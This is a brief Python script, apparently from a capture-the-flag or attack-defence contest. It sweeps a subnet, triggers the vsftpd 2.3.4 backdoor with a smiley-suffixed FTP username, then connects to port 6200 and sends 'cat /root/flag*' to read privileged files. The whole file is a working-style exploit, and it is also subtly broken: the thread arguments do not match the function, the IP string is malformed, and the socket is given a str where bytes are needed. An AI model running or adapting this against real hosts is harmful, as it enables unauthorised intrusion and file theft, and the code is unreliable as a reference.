# -*- coding = utf-8 -*-
# @Time:2022/6/19 上午 文件检查文件:50
# @Author:CK
# @File:扫网段的
# @Software:PyCharm
import threading
import socket
from ftplib import FTP
import time
def ftpcon(ip,user):
    try:
        ftp=FTP()
        ftp.connect(ip,'21',0.01)
        ftp.login('user:)','pass')
    except:
        pass
def nc(ip):
    try:
        s=socket.socket()
        s.connect((ip,6200))
        s.send('cat /root/flag*\n')
        flag=s.recv(2048)
        print (ip,":",flag)
        s.close()
    except:
        pass
if __name__=='__main__':
    for i in range(0,254):
        ip='192.168.38'+str(i)
        zt=threading.Thread(target=ftpcon, args=(ip,))
        zt.start()
        time.sleep(0.1)
        b=threading.Thread(target=nc,args=(ip,))
        b.start()
